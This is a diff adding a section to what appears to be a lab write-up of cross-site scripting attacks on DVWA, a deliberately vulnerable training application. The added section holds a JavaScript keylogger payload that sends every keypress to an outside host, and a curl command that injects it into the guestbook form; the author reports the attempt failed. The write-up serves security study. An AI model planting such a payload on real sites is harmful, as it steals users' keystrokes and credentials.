@@ -197,3 +197,31 @@ From which we found that the attack was successful:
       </ script>
 </div>  
 ```
+
+
+#### JavaScript Keylogger 
+
+```
+<script>
+document.onkeypress = function(e) {
+  var img = new Image();
+  img.src = 'http://192.168.57.10/log.php?key=' + e.key;
+}
+</script>
+```
+
+Run in the terminal as:
+
+```
+curl -v -X POST \ 
+    -b "security=$SECURITY; PHPSESSID=$PHPSESSID" \
+    -H "Content-Type: application/x-www-form-urlenconded" \
+    --data-urlencode="txtName=JS-keylogger" \
+    --data-urlencode="mtxtMessage=${JAVASCRIPT_KELOGGER_PAYLOAD}" \
+    -d "btnSign=Sign+Guestbook" \
+    "${DVWA_URL}/vulnerabilities/xss_s/" > javascript_keylogger_payload.txt
+```
+![XSS-reflected-JS-keylogger](XSS-reflected-JS-keylogger.png)
+
+Which means that we were not successful on doing an XSS-attack in this case
+
